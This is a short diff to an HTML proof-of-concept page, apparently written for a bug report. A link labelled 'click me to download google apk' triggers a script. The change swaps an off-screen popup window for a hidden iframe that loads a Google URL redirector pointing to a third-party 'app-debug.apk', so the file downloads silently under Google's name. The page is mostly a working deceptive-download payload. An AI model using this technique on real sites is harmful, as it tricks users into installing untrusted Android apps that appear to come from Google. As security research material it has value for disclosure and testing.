@@ -1,7 +1,7 @@
 <a href="#" onclick="poc()">click me to download google apk</a>
 <script>
     function poc(){
-        window.open("https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK","qq","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=100,height=100,left=-1000,top=-1000");
-    
+    document.getElementById("ifr").src="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK";
     }
 </script>
+<iframe id="ifr" src style="display:none"></iframe>
